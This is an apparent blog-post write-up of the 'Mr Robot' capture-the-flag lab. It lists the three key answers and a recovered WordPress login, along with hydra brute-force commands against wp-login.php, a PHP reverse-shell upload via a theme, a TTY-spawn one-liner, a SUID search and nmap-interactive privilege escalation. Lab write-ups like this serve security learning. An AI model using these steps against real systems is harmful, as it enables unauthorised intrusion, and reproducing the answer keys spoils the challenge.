---
title: "Mr Robot"

date: 2023-01-08
url: /mr-robot/
image: images/2023-thumbs/mr-robot.jpg
categories:
  - CTF
tags:
  - CTF
draft: false
---

Based on the Mr. Robot show, can you root this box?

## Questions
1. What is key 1? `073403c8a58a1f80d943455fb30724b9`
2. What is key 2? `822c73956184f694993bede3eb39f959`
3. What is key 3? `04787ddef27c3dee1ee161b21670b4e4`


---
## Notes
- IP = 10.10.2.159

- visited http://IP
- visited http://IP/robots.txt

- found fsocity.dic
- found key-1-of-3.txt

- WordPress
	- use hydra
		- Username: Elliot
		- Password: ER28-0652

WordPress Themes
- php reverse shell

Spawn TTY
- `python -c 'import pty; pty.spawn("/bin/bash")'`

Hash MD5 to get robot password

No sudo privileges
Find SUID flags
- `find / -type f -perm -04000 -ls 2>/dev/null`

Abuse nmap
- `nmap --interactive`
- `!sh`


### Exposed Services
```bash

```

### Users:Passwords
- Elliot:ER28-0652

### Vulnerabilities
- 

---
## Commands
`ping $IP`
`sudo nmap -sC -sV -oN nmap/initial 10.10.2.159`

`wget http://10.10.2.159/key-1-of-3.txt`
`wget http://10.10.2.159/fsocity.dic`

`hydra -v -t 30 -L fsocity.dic -p test 10.10.2.159 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"`
`hydra -v -t 30 -l Elliot -P fsocity.dic 10.10.2.159 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username"`
